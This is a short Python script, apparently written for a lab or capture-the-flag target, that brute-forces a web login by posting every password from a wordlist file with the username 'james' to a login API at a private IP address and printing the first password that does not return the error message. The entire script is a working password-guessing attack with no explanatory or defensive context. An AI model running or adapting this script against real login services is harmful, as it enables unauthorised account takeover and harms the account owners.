import requests
import json
import re
passwords=open("wordlists.txt","r")

for i in passwords:
    data = {'username': "james", 'password': i.strip()}
    respuesta = requests.post('http://10.10.220.248/api/user/login', data)
    msg_error = re.findall("Invalid Username Or Password",respuesta.text)
    if msg_error  == [] :
    	print("Correct Password: "+i)
    	quit()
